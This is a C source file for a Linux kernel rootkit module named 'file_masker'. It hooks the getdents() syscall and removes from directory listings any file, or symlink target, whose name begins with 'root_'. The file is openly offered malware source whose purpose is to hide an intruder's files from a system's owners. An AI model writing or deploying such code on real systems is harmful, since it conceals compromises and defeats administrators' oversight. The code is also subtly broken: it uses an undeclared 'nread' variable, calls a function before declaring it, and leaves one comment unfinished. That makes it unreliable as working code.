#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>
#include <linux/fs.h>

#include "file_masker.h"
#include "core.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */

#define PREF "root_"
#define NAME_BUF_SIZE 200

struct orig *calls;

/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the getdents() syscall. */
void file_masker_start(struct orig *original_syscalls)
{
	calls = original_syscalls;

	printk(KERN_INFO "file_masker rootkit: %s\n", "successfully inserted");
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original getdents() syscall. */
void file_masker_end(void)
{

	printk(KERN_INFO "file_masker rootkit: %s\n", "successfully removed");

	return;
}


/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count, int ret)
{
	int nread_temp;
	char name[NAME_BUF_SIZE];
	int size = 0;

	nread_temp = ret;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;
		size = 0;

		set_fs(KERNEL_DS);
		size = calls->readlinkat_syscall(fd, dirp->d_name, name, NAME_BUF_SIZE);
		set_fs(USER_DS);

		if (size > 0)
			name[size] = '\0';

		if (should_mask(dirp->d_name) || (size > 0 && should_mask(name))) {
			if (size > 0)
				printk(KERN_INFO "file_masker rootkit: hiding link %s which points to file %s\n", dirp->d_name, name);
			else
				printk(KERN_INFO "file_masker rootkit: hiding file %s\n", dirp->d_name);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			nread -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return nread;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}

/* Function used to parse paths an extract the filename */
char *strip_path(const char *name)
{
	char *lst = strrchr(name, '/');

	if (lst != NULL)
		return ++lst;

	return name;
}


/* Function that checks whether we need to mask the specified pid */
int should_mask(const char *name)
{
	char *stripped = strip_path(name);
	char *res = strstr(stripped, PREF);

	return (res == stripped) ? 1 : 0;
}
